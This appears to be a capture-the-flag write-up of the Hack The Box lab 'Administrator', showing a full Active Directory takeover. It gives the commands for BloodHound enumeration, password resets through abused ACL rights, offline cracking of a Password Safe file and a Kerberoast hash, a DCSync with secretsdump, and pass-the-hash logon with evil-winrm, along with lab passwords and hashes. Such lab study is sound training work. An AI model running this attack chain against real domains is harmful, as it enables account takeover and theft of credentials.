We start with the following credentials

User =**Olivia**
Pass = **ichliebedich**


Nmap scan

```
nmap -sVC 10.129.230.18 -oN scan.txt
```

```
<SNIP>

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-13 20:54:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```
Let's add the found domain and the name of the target to our /etc/hosts file

```
echo '10.129.230.18 administrator.htb dc.administrator.htb' >> /etc/hosts
```

Now we use the tool **bloodhound.py** to enumerate the domain with our given user

```
bloodhound.py -c All -d "administrator.htb" -u "olivia" -p "ichliebedich" -ns "10.129.230.18"
```

![Pasted image 20251113150503](Images/Pasted%20image%2020251113150503.png)

Then we launch **bloodhood**, but first we must launch the neo4j database

```
neo4j start
```

Then we upload our files to bloodhound

![Pasted image 20251113181239](Images/Pasted%20image%2020251113181239.png)

First thing we should do now is set the user **Olivia** as owned and look for it's relation

![Pasted image 20251113181416](Images/Pasted%20image%2020251113181416.png)

We notice that user **OLIVIA** has GenericAll right on user **MICHAEL**

I first tried to do a kerberos attack so i could get his hash in order to crack it (note that i had to use the **faketime** to set the same time of the target on me)

![Pasted image 20251113182506](Images/Pasted%20image%2020251113182506.png)

But i could'nt crack it, so i changed it's password to `Password123` and see what rights **michael** has on the target.
```
net rpc password "michael" "Password123" -U "administrator.htb"/"olivia"%"ichliebedich" -S "dc.administrator.htb"
```

We see that the user has **ForceChangePassword** on user **BENJAMIN**

![Pasted image 20251113183806](Images/Pasted%20image%2020251113183806.png)

So i changed his password to `Password123` as well

```
net rpc password "benjamin" "Password123" -U "administrator.htb"/"michael"%"Password123" -S "dc.administrator.htb"
```

Now by looking at bloodhound, we notice that our newly compromised user **BENJAMIN** is a member of the non default group **SHARE MODERATORS**.

I tried to connect to the ftp server with **benjamin** and the password we set him

![Pasted image 20251113184322](Images/Pasted%20image%2020251113184322.png)

It worked ! Let's see what we can find

I found the file `Backup.psafe3` on the ftp server which i tranfered to my machine

![Pasted image 20251113185324](Images/Pasted%20image%2020251113185324.png)

Since it's a psafe3 file, i had to download the software **password safe**

```
apt-get install passwordsafe
```
After the download, i opened up the file

```
pwsafe Backup.psafe3
```

![Pasted image 20251113191344](Images/Pasted%20image%2020251113191344.png)

We are asked for a master password

I use **pwsafe2john** to get the hash of the master password and then i cracked it using **John The Ripper**.

![Pasted image 20251113190517](Images/Pasted%20image%2020251113190517.png)
The master password is `tekieromucho`, let's open the file now.

![Pasted image 20251113191543](Images/Pasted%20image%2020251113191543.png)

We got 3 entries, by right clicking on an entry and selecting "edit" we can see their password.

Let's right them down

- emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
- alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
- emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur


When looking again at bloodhound, we notice that user **emily** is a member of **REMOTE MANAGEMENT USERS** group, which mean that she can connect via winrm on the target.

We confirm this with **evil-wirm**

```
evil-winrm -u "emily" -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -i "10.129.230.18"
```
![Pasted image 20251113194911](Images/Pasted%20image%2020251113194911.png)
It worked, so i took the user flag in her Desktop directorie

Let's get back to bloodhound, and see the rights of **emily**

![Pasted image 20251113195054](Images/Pasted%20image%2020251113195054.png)

She has `GenericWrite` on the user **ETHAN**, so i tried to do a targeted Kerberoast attack to get an hash that could crack his password

![Pasted image 20251113195952](Images/Pasted%20image%2020251113195952.png)

I got ethan's hash, let's try to crack it with hashcat and rockyou

```
hashcat kerberoast.txt `fzf-wordlists`
```

```
<SNIP>

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$d897f0babe775fee25023ff8af4bf8c9$a1adf400174406148f35f2ae6ad206d220012387302874699af95e2435eea061022c394852990ec9e5ee43508ca2f33f01dc64779a326a4a8d3efcf71c8a268b3fba021266d3c8896ec7eb58b69a48208a62998f751ce885b6b35980f244c7845d3f8497e59b09fc668086827ff64ed865708d6efc51d2e0520d9b0f0098dc86b8248deb4b159f5fc07dd146428295fdacc8786063d9f308b979f32832b99141ecb162fb77c9863d86d46bd440b932c6b99bebf4acc2389371c419bb8467282545fddfbe9a3a8d1d12b643da7d06be2d5f768ab52bdaa329f52a38ce663bb3d8b3494940503a4df7263c7ee9589fddd5ee594b757014529d9b2920ecc11586338e0184c708e255a50eb384e7e4c6026169120393f68bfbe05e20287a75b368c9227f90bc2cc1184d0f9fdc321f6e5c2fe2705ffedac30105e8a95a9750c4f208db4912bc20688273efe82f665871267449f7a1fe5dcc56e1100db970022af00e92afedd20dba3d27be3a2c4e9c0b3b23e6179d0ac76907cc5b9b41524f0966d49fbecaca8941f88dc7ab2880c7c978d83be834ed4f8de5eac06fd64f32c518673958cde419b68946da313de13b31915c8b148ac3d0b842a758a91aa784ab78baf95a5ef70ccac25523097ddb9d2129cc429abdee01cf4e2c1928dfafd8538f530cfb415188c904ce8b7ffe8c386195eaf6aaf12116f1a083740874720ec2643b40cda863ebf33c99a44ada82191ec5b0a00bbb5b2544e0adc0560f45d2577da33c30f288ca970f3bd6e65ee8f7302f028f4c7c882fc83c57862ebda4e14a65901c0d9528ae063b7d3ba500bf5990edfe6d450b873ebd9b2223f84dfa3daad0a025cda2cc701d7a3b900609f904bdc2c3d7a1cbe1d382a08f3cf2e5f48c129119a9789ace635aac44da6f432032d75e3f2f3bcdb613f9f733b223baca257953d03ae0de2a5d2144dcfedce15a9b61b9c8b9fed03283251ff7112d181a46d2b4ee8df01bb0bbc26ee1638341c6200bd2dd31a6dadc2e0b9fbbc48912f5ba653f663ad94e07b3e5c31d704076f9552aca38e5765feaf7c2dfe29fa16e2aaf111558a75f5f1ef5028ee917ab2ca02bdabc824577e587827907d0a30de80dbcb2df1c9791be1604ef5b8d50acc47ef49a769698da44788a0d1df2adf1e1f3ab693e6a7bf3d084794ddfdda360c0b4fad4c8d0a337aaf24ee5961cc4015ed97e3e68b3425b5886d28d41e342a9decacf7c776166644bacb449b88986f251bbf6f94c0d96e33dae323401ec004e04c37eddeb2d0dd97e3fc8c9a9d6e182e6cc453cc396280d9b12a15efb2f17a89db62368279fe2ee92a1b6e9bba713d82dbcc23aa2cbf722414e6793e16b049651213538e84e5c1bbcda965abb28eebfab054aa2ff61a08da31def645c49d5e96c50bf0309b2a667c90733bd13a62a48c44c8f400707c338eefc721045b1aea3840c4eda0627d9a1eec04a13135d15086be67436709d78a90dc000b2c838817358fb293408915c980122db5085c09acfbd8b1fd12d:limpbizkit

<SNIP>
```

His password is `limpbizkit`

Let's see his rights on bloodhound

![Pasted image 20251116105743](Images/Pasted%20image%2020251116105743.png)

The user **Ethan** has **DCSync** right on the domain of the target. Which means we can perform a **DCSync Attack** allowing us to get the hash of every users on the target with the tool **secretsdump** from impacket.

```
secretsdump.py administrator.htb/ethan:limpbizkit@10.129.230.18
```
![Pasted image 20251116110047](Images/Pasted%20image%2020251116110047.png)

Now that we got the administrator Hash, we get connect via Winrm with the Pass-The-Hash technique

```
evil-winrm -u Administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e" -i "10.129.230.18"
```
![Pasted image 20251116110247](Images/Pasted%20image%2020251116110247.png)

And we get the root flag

